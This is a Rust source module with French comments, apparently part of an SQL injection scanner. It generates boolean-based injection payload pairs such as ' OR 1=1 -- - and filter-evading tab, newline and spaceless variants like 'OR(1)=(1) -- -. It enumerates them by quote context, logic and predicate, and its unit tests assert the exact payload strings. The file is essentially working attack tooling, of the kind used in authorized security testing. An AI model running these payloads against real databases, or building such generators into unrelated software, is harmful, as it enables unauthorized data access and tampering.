#![deny(unsafe_code)]

//! Assemblage déterministe des paires génératives.
//!
//! Énumération : fences priorisés par contexte × logiques (`OR` puis `AND`)
//! × prédicats (noyau d'abord). Le décalage de départ est tiré du seed
//! (même seed → même séquence) pour explorer des sous-espaces différents
//! selon les runs ; sans seed, tirage OS (même philosophie que les tampers
//! aléatoires). L'appelant déduplique contre l'historique (zéro requête
//! redondante) et tronque au budget.

use std::collections::HashSet;

use crate::dbms::common::DbmsKind;
use crate::dbms::context::InjectionContext;
use crate::generation::grammar::{Logic, Predicate, QuoteFence, Separator};
use crate::techniques::boolean::payloads::BooleanPayload;

use super::GenerativeMode;

/// Candidat généré : paire + label de trace hashes-only (`gen:<fence>+<logic>+<pred>`).
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct GeneratedCandidate {
    /// Paire TRUE/FALSE assemblée (même shape, flip minimal).
    pub payload: BooleanPayload,
    /// Label (`gen:single+or+eqint`), jamais de payload en clair en trace.
    pub label: String,
}

/// Assemble une paire pour `(fence, logique, prédicat, DBMS, commentaire, séparateur)`.
///
/// Forme espacée : `{open}{sep}{LOGIC}{sep}{pred}{comment}`, ex.
/// `' OR 1=1 -- -` ou `'%09OR%091=1 -- -` (tab).
/// Forme spaceless (`NoSpace*`, séparateur ignoré) : `{open}{LOGIC}{pred}{comment}`,
/// ex. `'OR(1)=(1)-- -` — aucun espace hors commentaire.
/// Cohérence par construction (littéraux TRUE/FALSE distincts par prédicat).
#[must_use]
pub fn build_pair(
    fence: QuoteFence,
    logic: Logic,
    predicate: Predicate,
    kind: DbmsKind,
    comment: &str,
    sep: Separator,
) -> BooleanPayload {
    let (t, f) = predicate.branches(kind);
    let open = fence.open();
    let kw = logic.keyword();
    let (true_payload, false_payload) = if predicate.is_spaceless() {
        (
            format!("{open}{kw}{t}{comment}"),
            format!("{open}{kw}{f}{comment}"),
        )
    } else {
        let s = sep.as_str();
        (
            format!("{open}{s}{kw}{s}{t}{comment}"),
            format!("{open}{s}{kw}{s}{f}{comment}"),
        )
    };
    BooleanPayload::new(true_payload, false_payload, comment)
}

/// Label de trace d'un candidat (`gen:<fence>+<logic>+<pred>[+tab|+nl]`,
/// jamais de payload en clair en trace).
#[must_use]
pub fn candidate_label(
    fence: QuoteFence,
    logic: Logic,
    predicate: Predicate,
    sep: Separator,
) -> String {
    let base = format!("gen:{}+{}+{}", fence.name(), logic.name(), predicate.name());
    if sep == Separator::Space || predicate.is_spaceless() {
        base
    } else {
        format!("{base}+{}", sep.name())
    }
}

/// Énumère les candidats génératifs pour un contexte (sans dédup : voir
/// [`dedupe_against`]).
///
/// - `mode` : `Conservative` = prédicats noyau, `Aggressive` = tous.
/// - `max` : plafond (déjà clampé par l'appelant, `0..=MAX_GENERATED`).
/// - `seed` : décalage de départ déterministe (`None` = OS-random).
/// - `comment` : terminateur (voir [`comment_for`]).
#[must_use]
pub fn enumerate_candidates(
    context: &InjectionContext,
    kind: DbmsKind,
    comment: &str,
    mode: GenerativeMode,
    max: u8,
    seed: Option<u64>,
) -> Vec<GeneratedCandidate> {
    if max == 0 || mode == GenerativeMode::Off {
        return Vec::new();
    }
    let mut out = Vec::new();
    for fence in QuoteFence::ordered_for_context(&context.quote) {
        for logic in [Logic::Or, Logic::And] {
            for predicate in Predicate::all_ordered().iter().copied() {
                if mode == GenerativeMode::Conservative && !predicate.is_core() {
                    continue;
                }
                // Spaceless : un seul rendu (pas de séparateur à varier).
                if predicate.is_spaceless() {
                    let sep = Separator::Space;
                    let payload = build_pair(fence, logic, predicate, kind, comment, sep);
                    let label = candidate_label(fence, logic, predicate, sep);
                    out.push(GeneratedCandidate { payload, label });
                    continue;
                }
                for sep in [Separator::Space, Separator::Tab, Separator::Newline] {
                    let payload = build_pair(fence, logic, predicate, kind, comment, sep);
                    let label = candidate_label(fence, logic, predicate, sep);
                    out.push(GeneratedCandidate { payload, label });
                }
            }
        }
    }
    rotate_by_seed(&mut out, seed);
    out.truncate(usize::from(max));
    out
}

/// Retire les candidats déjà couverts par l'historique (comparaison sur la
/// branche TRUE exacte). L'appelant passe les `true_payload` historiques.
#[must_use]
pub fn dedupe_against<S: std::hash::BuildHasher>(
    mut candidates: Vec<GeneratedCandidate>,
    historical_true: &HashSet<String, S>,
) -> Vec<GeneratedCandidate> {
    candidates.retain(|c| !historical_true.contains(&c.payload.true_payload));
    candidates
}

/// Rotation déterministe du point de départ (exploration par seed).
fn rotate_by_seed(candidates: &mut [GeneratedCandidate], seed: Option<u64>) {
    if candidates.len() < 2 {
        return;
    }
    let mut rng = crate::seeded_rng::make_rng(seed);
    let offset = {
        use rand::Rng as _;
        rng.random_range(0..candidates.len())
    };
    candidates.rotate_left(offset);
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use crate::dbms::context::{CommentStyle, QuoteContext};
    use crate::generation::GenerativeMode;

    fn sample_ctx() -> InjectionContext {
        InjectionContext {
            quote: QuoteContext::SingleQuote,
            numeric: false,
            json: false,
            order_by: false,
            comment: CommentStyle::DashDash,
        }
    }

    #[test]
    fn build_pair_shapes_and_labels() {
        let p = build_pair(
            QuoteFence::Single,
            Logic::Or,
            Predicate::EqInt,
            DbmsKind::MySql,
            " -- -",
            Separator::Space,
        );
        assert_eq!(p.true_payload, "' OR 1=1 -- -");
        assert_eq!(p.false_payload, "' OR 1=2 -- -");
        assert_eq!(
            candidate_label(
                QuoteFence::Single,
                Logic::Or,
                Predicate::EqInt,
                Separator::Space
            ),
            "gen:single+or+eqint"
        );
        let bare = build_pair(
            QuoteFence::Bare,
            Logic::And,
            Predicate::Like,
            DbmsKind::Postgres,
            " --",
            Separator::Space,
        );
        assert_eq!(bare.true_payload, "1 AND 'a' LIKE 'a' --");
    }

    #[test]
    fn spaceless_pairs_carry_no_space_outside_comment() {
        let p = build_pair(
            QuoteFence::Single,
            Logic::Or,
            Predicate::NoSpaceEq,
            DbmsKind::MySql,
            " -- -",
            Separator::Space,
        );
        assert_eq!(p.true_payload, "'OR(1)=(1) -- -");
        assert_eq!(p.false_payload, "'OR(1)=(2) -- -");
        // Seuls les espaces du commentaire survivent.
        let body = p.true_payload.strip_suffix(" -- -").expect("comment");
        assert!(!body.contains(' '), "spaceless body has spaces: {body}");
        assert!(!body.contains("%20"));
        assert_eq!(
            candidate_label(
                QuoteFence::Single,
                Logic::Or,
                Predicate::NoSpaceEq,
                Separator::Space
            ),
            "gen:single+or+nospace-eq"
        );
    }

    #[test]
    fn tab_pairs_use_tab_separators_and_tab_labels() {
        let p = build_pair(
            QuoteFence::Single,
            Logic::Or,
            Predicate::EqInt,
            DbmsKind::MySql,
            " -- -",
            Separator::Tab,
        );
        assert_eq!(p.true_payload, "'\tOR\t1=1 -- -");
        assert_eq!(
            candidate_label(
                QuoteFence::Single,
                Logic::Or,
                Predicate::EqInt,
                Separator::Tab
            ),
            "gen:single+or+eqint+tab"
        );
        let nl = build_pair(
            QuoteFence::Bare,
            Logic::And,
            Predicate::EqInt,
            DbmsKind::MySql,
            " -- -",
            Separator::Newline,
        );
        assert_eq!(nl.true_payload, "1\nAND\n1=1 -- -");
    }

    #[test]
    fn enumerate_respects_mode_and_max() {
        let ctx = sample_ctx();
        let cons = enumerate_candidates(
            &ctx,
            DbmsKind::MySql,
            " -- -",
            GenerativeMode::Conservative,
            255,
            Some(1),
        );
        let aggr = enumerate_candidates(
            &ctx,
            DbmsKind::MySql,
            " -- -",
            GenerativeMode::Aggressive,
            255,
            Some(1),
        );
        // Pool total : 9 fences × 2 logiques × (2 spaceless + 5 noyau×3 seps)
        // = 306 en conservateur ; agressif : 9×2×(2 + 10×3) = 576. Les deux
        // dépassent `u8::MAX` : `max=255` sature (truncate), et les totaux
        // sont vérifiés arithmétiquement sur les métadonnées d'enum.
        assert_eq!(cons.len(), 255);
        assert_eq!(aggr.len(), 255);
        let core = Predicate::all_ordered()
            .iter()
            .filter(|p| p.is_core())
            .count();
        let spaceless = Predicate::all_ordered()
            .iter()
            .filter(|p| p.is_spaceless())
            .count();
        assert_eq!(core, 7);
        assert_eq!(spaceless, 2);
        assert_eq!(9 * 2 * (spaceless + 5 * 3), 306);
        assert_eq!(
            9 * 2 * (spaceless + (Predicate::all_ordered().len() - spaceless) * 3),
            576
        );
        assert!(cons.iter().all(|c| !c.payload.true_payload.is_empty()));
        assert!(
            cons.iter()
                .all(|c| c.payload.true_payload != c.payload.false_payload)
        );
        // Plafond + OFF.
        assert_eq!(
            enumerate_candidates(
                &ctx,
                DbmsKind::MySql,
                " -- -",
                GenerativeMode::Conservative,
                4,
                Some(1)
            )
            .len(),
            4
        );
        assert!(
            enumerate_candidates(
                &ctx,
                DbmsKind::MySql,
                " -- -",
                GenerativeMode::Off,
                4,
                Some(1)
            )
            .is_empty()
        );
        assert!(
            enumerate_candidates(
                &ctx,
                DbmsKind::MySql,
                " -- -",
                GenerativeMode::Conservative,
                0,
                Some(1)
            )
            .is_empty()
        );
    }

    #[test]
    fn same_seed_same_sequence() {
        let ctx = sample_ctx();
        let a = enumerate_candidates(
            &ctx,
            DbmsKind::MySql,
            " -- -",
            GenerativeMode::Conservative,
            8,
            Some(42),
        );
        let b = enumerate_candidates(
            &ctx,
            DbmsKind::MySql,
            " -- -",
            GenerativeMode::Conservative,
            8,
            Some(42),
        );
        let seq = |v: &[GeneratedCandidate]| v.iter().map(|c| c.label.clone()).collect::<Vec<_>>();
        assert_eq!(seq(&a), seq(&b));
    }

    #[test]
    fn context_leads_with_matching_fence() {
        // Propriété structurelle : l'énumération suit l'ordre du contexte
        // (le premier fence priorisé diffère single vs numeric).
        let single = QuoteFence::ordered_for_context(&QuoteContext::SingleQuote);
        let numeric = QuoteFence::ordered_for_context(&QuoteContext::None);
        assert_ne!(single[0], numeric[0]);
    }

    #[test]
    fn dedupe_removes_historical() {
        let ctx = sample_ctx();
        let out = enumerate_candidates(
            &ctx,
            DbmsKind::MySql,
            " -- -",
            GenerativeMode::Conservative,
            255,
            Some(7),
        );
        let hist: HashSet<String> = ["' OR 1=1 -- -".to_owned()].iter().cloned().collect();
        let kept = dedupe_against(out, &hist);
        assert!(
            kept.iter()
                .all(|c| c.payload.true_payload != "' OR 1=1 -- -")
        );
    }
}
